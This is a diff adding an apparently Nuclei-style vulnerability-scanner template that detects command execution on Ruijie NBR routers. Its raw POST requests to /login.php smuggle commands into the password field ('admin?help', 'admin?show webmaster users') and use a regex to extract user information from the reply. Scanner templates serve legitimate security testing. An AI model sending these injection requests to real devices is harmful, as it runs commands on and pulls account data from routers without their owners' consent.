@@ -1,0 +1,49 @@
+id: ruijie-nbr-router-rce
+info:
+  name: Ruijie NBR Router Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Ruijie Ruiyi smart series routers are susceptible to RCE due to improper input handling in user authentication requests. Exploits can allow attackers to run arbitrary commands on the device.
+  reference:
+    - http://www.ruijiery.com/cp/wg/
+  tags: rce, router
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin?help
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "show pr"
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin?show%20webmaster%20users
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "show webmaster users"
+    extractors:
+      - type: regex
+        name: user-info
+        internal: true
+        regex:
+          - "(?<=<userinfo>)(.*?)(?=</userinfo>)"
